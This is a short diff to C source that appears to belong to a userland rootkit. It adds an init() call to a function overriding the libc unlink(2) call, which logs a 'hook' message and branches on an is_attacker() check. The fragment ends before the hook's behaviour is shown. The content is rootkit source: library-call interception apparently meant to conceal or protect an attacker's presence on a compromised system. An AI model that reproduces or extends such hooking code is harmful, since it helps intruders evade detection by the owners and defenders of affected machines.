@@ -25,6 +25,7 @@
 #include "hooks.h" /* prototype */
 
 int unlink(const char *pathname) {
+    init();
     DEBUG(D_INFO, "called unlink(2) hook");
 
     if (is_attacker())
